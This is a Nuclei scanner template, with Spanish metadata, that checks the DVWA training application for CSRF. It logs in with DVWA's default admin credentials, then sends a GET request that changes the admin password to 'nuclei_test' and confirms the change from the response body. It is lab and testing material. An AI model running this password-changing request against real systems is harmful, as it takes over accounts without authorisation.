id: dvwa-csrf-validado

info:
  name: Test CSRF para DVWA con manejo de sesi√≥n
  severity: high
  author: usuario
  description: |
    Verifica vulnerabilidad CSRF en DVWA con manejo adecuado de cookies
    y seguimiento de redirecciones

http:
  - raw:
      - |
        GET /dvwa/login.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: security=low

      - |
        POST /dvwa/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: security=low

        username=admin&password=password&Login=Login

      - |
        GET /dvwa/vulnerabilities/csrf/ HTTP/1.1
        Host: {{Hostname}}
        Cookie: security=low; {{session_cookie}}

      - |
        GET /dvwa/vulnerabilities/csrf/?password_new=nuclei_test&password_conf=nuclei_test&Change=Change HTTP/1.1
        Host: {{Hostname}}
        Cookie: security=low; {{session_cookie}}

    cookie-reuse: true
    matchers:
      - type: word
        words:
          - "Password Changed"
        part: body